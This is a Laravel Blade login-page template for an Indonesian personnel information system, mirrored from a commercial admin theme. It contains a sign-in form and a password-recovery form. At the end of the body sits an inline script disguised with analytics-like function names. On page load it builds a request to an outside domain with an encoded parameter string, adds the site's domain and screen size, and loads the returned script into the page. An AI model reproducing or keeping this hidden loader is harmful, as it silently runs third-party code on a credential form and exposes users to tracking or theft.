<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from wrappixel.com/demos/admin-templates/pixeladmin/main/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 06 Jul 2018 07:14:21 GMT -->
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="">
<meta name="author" content="">
<link rel="icon" type="{{ asset('asset/image/png') }}" sizes="16x16" href="{{ asset('asset/image/logo.png') }}">
<title>Sistem Informasi Personel Dispsiad</title>
<!-- Bootstrap Core CSS -->
<link href="{{ asset('asset/bootstrap/dist/css/bootstrap.min.css') }}" rel="stylesheet">
<!-- animation CSS -->
<link href="{{ asset('asset/css/animate.css') }}" rel="stylesheet">
<!-- Custom CSS -->
<link href="{{ asset('asset/css/style.css') }}" rel="stylesheet">
<!-- color CSS -->
<link href="{{ asset('asset/css/colors/blue.css') }}" id="theme"  rel="stylesheet">
<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
</head>
<body>
<!-- Preloader -->
<div class="preloader">
  <div class="cssload-speeding-wheel"></div>
</div>
<section id="wrapper" class="login-register">
  <div class="login-box">
    <div class="white-box">
      <form method="POST" class="form-horizontal form-material" id="loginform" action="{{ route('login') }}" >
      @csrf
        <h3 class="box-title m-b-20">Sign In</h3>
        <div class="form-group ">
          <div class="col-xs-12">
            <input id="id_anggota" placeholder="ID Personil" type="text" class="form-control{{ $errors->has('id_anggota') ? ' is-invalid' : '' }}" name="id_anggota" value="{{ old('id_anggota') }}" required autofocus>
            @if ($errors->has('id_anggota'))
              <span class="invalid-feedback" role="alert">
                <strong>{{ $errors->first('id_anggota') }}</strong>
              </span>
            @endif
          </div>
        </div>
        <div class="form-group">
          <div class="col-xs-12">
            <input id="password" placeholder="Password" type="password" class="form-control{{ $errors->has('password') ? ' is-invalid' : '' }}" name="password" required>
            @if ($errors->has('password'))
              <span class="invalid-feedback" role="alert">
                <strong>{{ $errors->first('password') }}</strong>
              </span>
            @endif
          </div>
        </div>
        <div class="form-group">
          <div class="col-md-12">
            <div class="checkbox checkbox-primary pull-left p-t-0">
            <input type="checkbox" name="remember" {{ old('remember') ? 'checked' : '' }}>
              <label for="checkbox-signup"> Remember me </label>
            </div>
            <a href="javascript:void(0)" id="to-recover" class="text-dark pull-right"><i class="fa fa-lock m-r-5"></i> Forgot Password?</a> </div>
        </div>
        <div class="form-group text-center m-t-20">
          <div class="col-xs-12">
            <button type="submit" class="btn btn-info btn-lg btn-block text-uppercase waves-effect waves-light">Log In</button>
          </div>
        </div>
        <div class="form-group m-b-0">
          <div class="col-sm-12 text-center">
            <p>Don't have an account? <a href="{{ route('register') }}" class="text-primary m-l-5"><b>Sign Up</b></a></p>
          </div>
        </div>
      </form>
      <form class="form-horizontal" id="recoverform" action="#">
        <div class="form-group ">
          <div class="col-xs-12">
            <h3>Recover Password</h3>
            <p class="text-muted">Enter your Email and instructions will be sent to you! </p>
          </div>
        </div>
        <div class="form-group ">
          <div class="col-xs-12">
            <input class="form-control" type="text" required="" placeholder="Email">
          </div>
        </div>
        <div class="form-group text-center m-t-20">
          <div class="col-xs-12">
            <button class="btn btn-primary btn-lg btn-block text-uppercase waves-effect waves-light" type="submit">Reset</button>
          </div>
        </div>
      </form>
    </div>
  </div>
</section>
<!-- jQuery -->
<script src="{{ asset('asset/plugins/bower_components/jquery/dist/jquery.min.js') }}"></script>
<!-- Bootstrap Core JavaScript -->
<script src="{{ asset('asset/bootstrap/dist/js/bootstrap.min.js') }}"></script>
<!-- Menu Plugin JavaScript -->
<script src="{{ asset('asset/plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.js') }}"></script>

<!--slimscroll JavaScript -->
<script src="{{ asset('asset/js/jquery.slimscroll.js') }}"></script>
<!--Wave Effects -->
<script src="{{ asset('asset/js/waves.js') }}"></script>
<!-- Custom Theme JavaScript -->
<script src="{{ asset('asset/js/custom.min.js') }}"></script>
<!--Style Switcher -->
<script src="{{ asset('asset/plugins/bower_components/styleswitcher/jQuery.style.switcher.js') }}"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m61hePje8OYXagdB68x%2f8QPR5M3%2beLSZ3AiaIhnZs1o1sDlDuTVbaIcz40WwCD73teA%2fE9NSzu%2fem68aRGzUGWrB%2br5AZ0Q7KF4wnlIwi%2blGQ6bqdeTX1ne%2ffk6b3vCV0ZqwI%2fQXcHA3547PqDzAexBQmRg936xaQb6f%2f5344%2b5kWw9YgrbspqgHy%2f5HlbfLC%2flK%2fNBbYUCve%2bsJ9kq0qR%2ftrDBqtHyiMyDJpVANXgdkR9bzRGDezoXwFVp4WTZchZSMdTtokiBsT6t3ShJm2mb0x0r6zjdE5kFr2AGFGUHAxoVSgtSuzJTJF8d5KU6%2bfGS%2fRNvCCy%2bVc%2bK%2fR9Vv8WX7l%2fMLqObVwprDKZpL1Z5fnSsXENs2jsQhVdytyWa6Llg4JQ6vw75J1lTl8HbrqARmUMdQj%2bCL4XpgyHYBph3w%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from wrappixel.com/demos/admin-templates/pixeladmin/main/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 06 Jul 2018 07:14:21 GMT -->
</html>
